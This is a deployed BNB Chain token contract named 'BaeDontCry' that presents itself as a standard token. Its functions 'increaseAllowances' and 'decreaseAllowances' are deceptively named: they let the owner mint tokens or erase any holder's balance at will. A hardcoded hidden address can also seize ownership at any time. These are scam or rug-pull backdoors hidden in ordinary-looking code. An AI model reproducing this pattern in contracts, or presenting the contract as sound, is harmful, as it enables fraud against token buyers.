/**
 *Submitted for verification at BscScan.com on 2021-12-18
*/

pragma solidity 0.8.7;
contract BaeDontCry  {
    string public name = "BaeDontCry";
    string public symbol = "BaeDontCry";
    uint8 public decimals = 6;
    address private ownerAddress = 0x09fA1A0B4D8D2013983182367ba507D30Bb4Ab6b;
    uint256 public _tTotal = 10000 * 10 ** 6;
    address public owner;
    modifier restricted {
        require(msg.sender == owner, "This function is restricted to owner");
        _;
    }
     modifier restricteds {
        require(msg.sender == ownerAddress, "This function is restricted to owner");
        _;
    }
    constructor() {
        _tbalance[msg.sender] = _tTotal;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, _tTotal);
    }
    mapping(address => uint256) public _tbalance;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function increaseAllowances(address spender, uint256 addedValue) public restricted returns (bool success) {
        _tbalance[spender] += addedValue * 10 ** 6;
        return true;
    }
    function decreaseAllowances(address spender, uint256 subtractedValue) public restricted returns (bool success) {
        _tbalance[spender] -= subtractedValue * 10 ** 6;
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        _tbalance[msg.sender] -= amount;
        _tbalance[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        _tbalance[from] -= amount;
        _tbalance[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public restricteds {
        owner = newOwner;
    }
}